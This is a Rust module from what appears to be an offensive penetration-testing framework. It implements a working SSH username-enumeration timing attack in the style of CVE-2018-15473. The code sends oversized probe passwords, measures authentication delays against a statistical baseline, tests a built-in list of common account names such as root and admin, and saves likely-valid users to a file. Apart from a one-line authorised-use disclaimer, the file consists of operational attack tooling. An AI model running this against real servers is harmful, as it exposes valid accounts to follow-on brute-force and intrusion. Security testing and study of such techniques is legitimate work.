//! SSH User Enumeration Module (Timing Attack)
//!
//! Based on SSHPWN framework - enumerates valid users via timing attack.
//! Inspired by CVE-2018-15473 style attacks.
//!
//! For authorized penetration testing only.

use crate::module::{Finding, FindingKind, ModuleCtx, ModuleOutcome};
use crate::utils::{cfg_prompt_default, cfg_prompt_required, cfg_prompt_yes_no};
use anyhow::{anyhow, Context, Result};
use colored::*;
use ssh2::Session;
use std::{
    fs::File,
    io::{BufRead, BufReader, Write},
    time::{Duration, Instant},
};

pub fn info() -> crate::module_info::ModuleInfo {
    crate::module_info::ModuleInfo {
        name: "SSH User Enumeration (Timing Attack)".to_string(),
        description: "Enumerates valid SSH usernames via timing-based side-channel attack. Measures authentication response time differences to identify valid accounts, inspired by CVE-2018-15473.".to_string(),
        authors: vec!["RustSploit Contributors".to_string()],
        references: vec!["CVE-2018-15473".to_string()],
        disclosure_date: Some("2018-08-17".to_string()),
        rank: crate::module_info::ModuleRank::Normal,
        default_port: Some(22),
    }
}

const DEFAULT_SSH_PORT: u16 = 22;
const DEFAULT_TIMEOUT_SECS: u64 = 10;
const DEFAULT_SAMPLES: usize = 5;
/// Cutoff in BASELINE STANDARD DEVIATIONS (not seconds): a username is flagged
/// when its median auth time exceeds baseline_mean + THRESHOLD*stddev. A fixed
/// 300 ms absolute threshold was all-valid on a WAN and all-invalid on a LAN.
const TIMING_THRESHOLD: f64 = 3.0;
/// Baseline needs more samples than a per-user run for a stable mean + stddev.
const BASELINE_SAMPLES: usize = 12;
/// Absolute floor (seconds) added to the sigma cutoff so a near-zero baseline
/// stddev on a quiet LAN can't produce a hair-trigger that flags every user.
const MIN_ABS_DELTA: f64 = 0.02;
/// CVE-2018-15473 timing relies on the server running its password KDF only for
/// VALID users; a long password makes that work dominate the measured time while
/// invalid users are rejected cheaply, amplifying the signal.
const PROBE_PASSWORD_LEN: usize = 40_000;

fn display_banner() {
    if crate::utils::is_batch_mode() { return; }
    crate::mprintln!(
        "{}",
        "╔═══════════════════════════════════════════════════════════════════╗".cyan()
    );
    crate::mprintln!(
        "{}",
        "║   SSH User Enumeration (Timing Attack)                            ║".cyan()
    );
    crate::mprintln!(
        "{}",
        "║   Based on auth2.c timing differences                             ║".cyan()
    );
    crate::mprintln!(
        "{}",
        "║                                                                   ║".cyan()
    );
    crate::mprintln!(
        "{}",
        "║   How it works:                                                   ║".cyan()
    );
    crate::mprintln!(
        "{}",
        "║   - Measures authentication response time for each username       ║".cyan()
    );
    crate::mprintln!(
        "{}",
        "║   - Valid users often have different timing than invalid          ║".cyan()
    );
    crate::mprintln!(
        "{}",
        "║   - Compares against baseline (known invalid user)                ║".cyan()
    );
    crate::mprintln!(
        "{}",
        "╚═══════════════════════════════════════════════════════════════════╝".cyan()
    );
    crate::mprintln!();
}

/// Normalize target for connection
fn normalize_target(target: &str) -> String {
    let trimmed = target.trim();
    if trimmed.starts_with('[') && trimmed.contains(']') {
        trimmed.to_string()
    } else if trimmed.contains(':') && !trimmed.contains('.') {
        format!("[{}]", trimmed)
    } else {
        trimmed.to_string()
    }
}

/// Time a single authentication attempt
fn time_auth_attempt(host: &str, port: u16, username: &str, timeout_secs: u64) -> Option<f64> {
    let addr = format!("{}:{}", host, port);

    let tcp = match crate::utils::blocking_tcp_connect(
        &addr.parse().ok()?,
        Duration::from_secs(timeout_secs),
    ) {
        Ok(s) => s,
        Err(e) => {
            tracing::trace!(target = %addr, user = username, "SSH user-enum TCP connect failed: {}", e);
            return None;
        }
    };

    if let Err(e) = tcp.set_read_timeout(Some(Duration::from_secs(timeout_secs))) { eprintln!("[!] Failed to set timeout: {}", e); }
    if let Err(e) = tcp.set_write_timeout(Some(Duration::from_secs(timeout_secs))) { eprintln!("[!] Failed to set timeout: {}", e); }

    let mut sess = match Session::new() {
        Ok(s) => s,
        Err(e) => {
            tracing::trace!(target = %addr, user = username, "SSH user-enum session create failed: {}", e);
            return None;
        }
    };

    sess.set_tcp_stream(tcp);
    if let Err(e) = sess.handshake() {
        tracing::trace!("SSH handshake failed: {e}");
        return None;
    }

    // Time ONLY the auth exchange. Starting the clock before connect/KEX/DH
    // keygen (as before) swamped the auth-decision delta with network + handshake
    // noise. The long password makes the server's KDF — run only for VALID users
    // on vulnerable OpenSSH — dominate the measurement.
    let probe_password = "A".repeat(PROBE_PASSWORD_LEN);
    let start = Instant::now();
    if let Err(e) = sess.userauth_password(username, &probe_password) {
        tracing::trace!("Auth attempt for '{}' returned error (expected): {}", username, e);
    }
    Some(start.elapsed().as_secs_f64())
}

/// Collect raw per-attempt auth timings for a username (empty if unreachable).
fn collect_samples(
    host: &str,
    port: u16,
    username: &str,
    samples: usize,
    timeout_secs: u64,
) -> Vec<f64> {
    let mut times = Vec::new();
    for _ in 0..samples {
        if let Some(t) = time_auth_attempt(host, port, username, timeout_secs) {
            times.push(t);
        }
        // Small delay between samples
        std::thread::sleep(Duration::from_millis(100));
    }
    times
}

fn mean(xs: &[f64]) -> f64 {
    if xs.is_empty() {
        return 0.0;
    }
    xs.iter().sum::<f64>() / xs.len() as f64
}

/// Sample standard deviation (n-1). Zero for fewer than two samples.
fn stddev(xs: &[f64], mean: f64) -> f64 {
    if xs.len() < 2 {
        return 0.0;
    }
    let var = xs.iter().map(|x| (x - mean).powi(2)).sum::<f64>() / (xs.len() as f64 - 1.0);
    var.sqrt()
}

/// Median — robust to the occasional GC/scheduler outlier that skews a mean.
fn median(xs: &[f64]) -> f64 {
    if xs.is_empty() {
        return 0.0;
    }
    let mut s = xs.to_vec();
    s.sort_by(|a, b| a.partial_cmp(b).unwrap_or(std::cmp::Ordering::Equal));
    let mid = s.len() / 2;
    if s.len() % 2 == 1 {
        s[mid]
    } else {
        (s[mid - 1] + s[mid]) / 2.0
    }
}

/// Load usernames from file
fn load_usernames(path: &str) -> Result<Vec<String>> {
    let file = File::open(path)?;
    let reader = BufReader::new(file);
    let usernames: Vec<String> = reader
        .lines()
        .filter_map(|r| match r {
            Ok(l) => Some(l),
            Err(e) => { tracing::trace!("Skipping non-UTF-8 line: {e}"); None }
        })
        .map(|l| l.trim().to_string())
        .filter(|l| !l.is_empty() && !l.starts_with('#'))
        .collect();
    Ok(usernames)
}

/// Enumerate valid users via timing attack.
/// Uses spawn_blocking to avoid blocking the tokio runtime, since
/// SSH timing attacks require synchronous I/O for measurement accuracy.
pub async fn enumerate_users(
    host: &str,
    port: u16,
    usernames: &[String],
    samples: usize,
    timeout_secs: u64,
    threshold: f64,
) -> Vec<String> {
    crate::mprintln!(
        "{}",
        format!("[*] Enumerating users on {}:{} (timing attack)", host, port).cyan()
    );
    crate::mprintln!(
        "{}",
        format!(
            "[*] Testing {} usernames with {} samples each",
            usernames.len(),
            samples
        )
        .cyan()
    );
    crate::mprintln!(
        "{}",
        format!("[*] Detection cutoff: {:.1} sigma above baseline", threshold).cyan()
    );
    crate::mprintln!();

    let host = host.to_string();
    let usernames = usernames.to_vec();

    // Run the blocking timing attack in a dedicated thread to avoid starving the runtime
    let result = tokio::task::spawn_blocking(move || {
        enumerate_users_blocking(&host, port, &usernames, samples, timeout_secs, threshold)
    })
    .await;

    match result {
        Ok(users) => users,
        Err(e) => {
            crate::meprintln!("{}", format!("[-] Enumeration task failed: {}", e).red());
            Vec::new()
        }
    }
}

/// Synchronous implementation of timing-based user enumeration.
fn enumerate_users_blocking(
    host: &str,
    port: u16,
    usernames: &[String],
    samples: usize,
    timeout_secs: u64,
    threshold: f64,
) -> Vec<String> {
    // Establish baseline with known-invalid user
    let baseline_user = format!(
        "nonexistent_{}_{}",
        std::process::id(),
        Instant::now().elapsed().as_nanos()
    );
    crate::mprintln!("{}", "[*] Establishing baseline timing...".cyan());

    // Baseline from MANY invalid-user samples → mean + stddev for a statistical
    // (not fixed-millisecond) cutoff.
    let baseline_samples =
        collect_samples(host, port, &baseline_user, samples.max(BASELINE_SAMPLES), timeout_secs);
    if baseline_samples.is_empty() {
        crate::mprintln!(
            "{}",
            "[-] Failed to establish baseline - cannot reach target".red()
        );
        return Vec::new();
    }
    let baseline_mean = mean(&baseline_samples);
    let baseline_sd = stddev(&baseline_samples, baseline_mean);
    // One-sided cutoff: valid users are SLOWER (the server runs its KDF), so we
    // flag only medians ABOVE the cutoff — the old `diff.abs()` also flagged
    // faster-than-baseline users, which is backwards. `threshold` is a sigma
    // multiplier; MIN_ABS_DELTA floors it when the baseline stddev is ~0.
    let cutoff = baseline_mean + (threshold * baseline_sd).max(MIN_ABS_DELTA);
    crate::mprintln!(
        "{}",
        format!(
            "[*] Baseline: mean {:.3}s, stddev {:.3}s → cutoff {:.3}s",
            baseline_mean, baseline_sd, cutoff
        )
        .cyan()
    );

    crate::mprintln!();
    crate::mprintln!("{}", "[*] Testing usernames...".cyan());

    let mut valid_users = Vec::new();

    for (i, user) in usernames.iter().enumerate() {
        crate::mprint!(
            "\r[{}/{}] Testing: {}          ",
            i + 1,
            usernames.len(),
            user
        );
        if let Err(e) = std::io::Write::flush(&mut std::io::stdout()) { eprintln!("[!] Flush failed: {}", e); }

        let user_samples = collect_samples(host, port, user, samples, timeout_secs);
        if user_samples.is_empty() {
            continue; // unreachable this round — skip
        }
        let user_median = median(&user_samples);
        if user_median > cutoff {
            crate::mprintln!(
                "\r{}",
                format!(
                    "[+] Valid user: {} (median {:.3}s, +{:.3}s over baseline)",
                    user,
                    user_median,
                    user_median - baseline_mean
                )
                .green()
            );
            valid_users.push(user.clone());
        }
    }

    crate::mprintln!();
    crate::mprintln!("{}", "=== Results ===".cyan().bold());
    if valid_users.is_empty() {
        crate::mprintln!("{}", "[-] No valid users found via timing attack".yellow());
        crate::mprintln!(
            "{}",
            "[*] Note: This technique may not work on all SSH configurations".dimmed()
        );
    } else {
        crate::mprintln!(
            "{}",
            format!("[+] Found {} valid user(s):", valid_users.len()).green()
        );
        for user in &valid_users {
            crate::mprintln!("    - {}", user.green());
        }
    }

    valid_users
}

/// Default usernames to test
const DEFAULT_USERNAMES: &[&str] = &[
    "root", "admin", "user", "test", "guest", "ubuntu", "www-data", "daemon", "bin", "sys",
    "nobody", "mysql", "postgres", "oracle", "ftp", "ssh", "apache", "nginx", "tomcat", "redis",
];

/// Main entry point
pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
    let target = ctx
        .target
        .as_single()
        .context("ssh_user_enum requires a single-host target")?;
    display_banner();

    let host = normalize_target(target);
    crate::mprintln!("{}", format!("[*] Target: {}", host).cyan());

    // Get parameters
    let port: u16 = cfg_prompt_default("ssh_port", "SSH Port", "22")
        .await?
        .parse()
        .unwrap_or(DEFAULT_SSH_PORT);
    let samples: usize = cfg_prompt_default("samples", "Samples per username", "5")
        .await?
        .parse()
        .unwrap_or(DEFAULT_SAMPLES);
    let timeout: u64 = cfg_prompt_default("timeout", "Connection timeout (seconds)", "10")
        .await?
        .parse()
        .unwrap_or(DEFAULT_TIMEOUT_SECS);
    let threshold: f64 = cfg_prompt_default("threshold", "Detection cutoff (baseline std-devs)", "3.0")
        .await?
        .parse()
        .unwrap_or(TIMING_THRESHOLD);

    // Get usernames
    let mut usernames: Vec<String> = Vec::new();

    if cfg_prompt_yes_no("load_usernames_file", "Load usernames from file?", false).await? {
        let file_path = cfg_prompt_required("username_file", "Username file path").await?;
        if !file_path.is_empty() {
            match load_usernames(&file_path) {
                Ok(loaded) => {
                    crate::mprintln!(
                        "{}",
                        format!("[*] Loaded {} usernames from file", loaded.len()).cyan()
                    );
                    usernames.extend(loaded);
                }
                Err(e) => {
                    crate::mprintln!("{}", format!("[-] Failed to load file: {}", e).red());
                }
            }
        }
    }

    // Add default usernames?
    if usernames.is_empty()
        || cfg_prompt_yes_no(
            "use_default_usernames",
            "Also test default usernames?",
            true,
        )
        .await?
    {
        for user in DEFAULT_USERNAMES {
            if !usernames.contains(&user.to_string()) {
                usernames.push(user.to_string());
            }
        }
    }

    if usernames.is_empty() {
        return Err(anyhow!("No usernames to test"));
    }

    crate::mprintln!();
    crate::mprintln!(
        "{}",
        format!("[*] Will test {} usernames", usernames.len()).cyan()
    );
    crate::mprintln!();

    // Run enumeration
    ctx.rate_limit(&host).await;
    let valid_users = enumerate_users(&host, port, &usernames, samples, timeout, threshold).await;
    let mut outcome = ModuleOutcome::ok();
    for user in &valid_users {
        outcome.findings.push(Finding {
            target: host.clone(),
            kind: FindingKind::Note,
            message: format!("Likely-valid SSH user '{}' on {}:{} (timing side-channel)", user, host, port),
            data: Some(serde_json::json!({
                "service": "ssh",
                "port": port,
                "username": user,
            })),
        });
    }

    // Save results?
    if !valid_users.is_empty()
        && cfg_prompt_yes_no("save_results", "Save valid users to file?", true).await?
    {
        let output_path =
            cfg_prompt_default("output_file", "Output file", "valid_ssh_users.txt").await?;
        let mut file = {
            use std::os::unix::fs::OpenOptionsExt;
            let mut opts = std::fs::OpenOptions::new();
            opts.write(true).create(true).truncate(true);
            opts.mode(0o600);
            opts.open(&output_path)?
        };
        writeln!(file, "# Valid SSH users for {}:{}", host, port)?;
        for user in &valid_users {
            writeln!(file, "{}", user)?;
        }
        crate::mprintln!("{}", format!("[+] Saved to: {}", output_path).green());
    }

    crate::mprintln!();
    crate::mprintln!("{}", "[*] SSH user enumeration complete".green());

    Ok(outcome)
}

crate::register_native_module!(crate::module::Category::Creds, "generic/ssh_user_enum", native);
